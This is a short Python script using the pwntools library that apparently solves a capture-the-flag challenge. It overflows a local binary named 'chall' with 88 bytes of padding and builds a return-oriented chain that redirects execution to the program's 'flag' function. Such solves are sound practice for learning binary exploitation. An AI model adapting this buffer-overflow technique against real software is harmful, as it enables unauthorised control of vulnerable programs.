from pwn import *
exe = context.binary = ELF("./chall")
r = process()
offset = 88
rop = ROP(exe)
rop.raw(b"A" * offset)
rop.raw(0x0000000000401016)
rop.raw(exe.sym['flag'])
r.sendline(rop.chain())
r.interactive()